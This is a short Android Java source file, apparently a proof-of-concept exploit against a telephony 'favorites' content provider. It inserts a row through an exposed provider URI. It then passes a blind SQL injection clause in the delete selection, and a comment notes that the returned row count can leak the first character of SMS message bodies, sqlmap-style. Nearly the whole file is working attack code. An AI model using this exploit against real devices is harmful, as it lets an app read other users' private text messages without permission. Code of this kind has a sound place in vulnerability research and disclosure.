package com.irsl.telephonyfavoritesprovider;

import androidx.appcompat.app.AppCompatActivity;

import android.content.ContentResolver;
import android.content.ContentValues;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;

public class MainActivity extends AppCompatActivity {

    private final static String TAG = "FavProvPoc";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        testFavInsert();
    }

    private void testFavInsert() {
        ContentResolver cr = getContentResolver();
        Uri uri = Uri.parse("content://fav-mms/fav_sms_no_original");

        ContentValues cv = new ContentValues();
        cv.put("network_type", "helo");
        Uri justInserted = cr.insert(uri, cv);
        Log.i(TAG, "insert returned: "+(justInserted != null ? justInserted.toString() : "(null)"));

        // we could use a logic similar to what sqlmap does at blind SQL injections
        // using the returned rows value to learn whether our guess was correct
        int rows = cr.delete(justInserted, "('T'=(SELECT SUBSTR(body,1,1) FROM sms LIMIT 0,1))", null);
        Log.i(TAG, "rows affected with arbitrary select clause: "+rows);
        rows = cr.delete(justInserted, "", null);
        Log.i(TAG, "rows affected normally: "+rows);
    }
}
